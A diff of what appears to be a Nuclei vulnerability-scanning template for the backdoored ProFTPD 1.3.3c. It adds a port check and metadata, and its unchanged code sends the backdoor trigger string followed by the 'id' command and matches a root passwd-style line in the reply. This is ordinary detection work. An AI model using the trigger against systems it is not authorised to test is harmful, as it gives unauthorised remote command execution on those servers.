@@ -10,11 +10,14 @@ info:
     - https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor_Command_Execution_Automated_Script/blob/main/README.md
     - https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/
   metadata:
-    shodan-query: product:"ProFTPD"
+    max-request: 1
+    shodan-query: "product:\"ProFTPD\""
   tags: js,network,proftpd,ftp,backdoor
 
 javascript:
-  - code: |
+  - pre-condition: |
+      isPortOpen(Host,Port);
+    code: |
       const data = ["HELP ACIDBITCHEZ\n", "id"];
       const c = require("nuclei/net");
       let conn = c.Open('tcp', `${Host}:${Port}`);
@@ -45,4 +48,4 @@ javascript:
       - type: regex
         regex:
           - "root:.*:0:0:"
-# digest: 4a0a00473045022100dd6e52def8924c5a01a17c75bb09fcc784f5f0353f2788939136ee3ecd00b9220220262dff383d49d22ef5a299f5352cd746313ee6814fee6dd76e6a0c8da707c5f9:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502204deeb7676e3bbce2a30f747f40105d6a6f267d77b233d601fb62e29970923c110221008c94d4e3d13c23c854b67ff899bc8904ad3bc98fd0e9d62b318b7a2ca70c45f8:922c64590222798bb761d5b6d8e72950
